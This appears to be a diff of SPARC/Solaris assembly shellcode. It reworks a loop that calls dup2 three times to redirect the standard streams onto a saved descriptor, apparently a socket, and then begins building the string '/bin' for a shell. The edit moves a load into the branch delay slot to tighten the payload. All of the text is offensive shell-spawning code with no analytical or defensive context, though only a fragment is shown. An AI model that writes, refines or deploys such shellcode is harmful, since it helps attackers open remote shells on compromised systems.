@@ -60,12 +60,12 @@ main:
 	st	%o0, [ %sp - 0x0c ]
 	mov	3, %o1
 dup2_loop:
-	ld	[ %sp - 0x0c ], %o0
 	subcc	%o1, 1, %o1
 	mov	0x5a, %g1 
 	ta	0x10
 
 	bnz	dup2_loop
+	ld	[ %sp - 0x0c ], %o0
 
 	xor	%o3, %o3, %o2
 	set	0x2f62696e, %l0
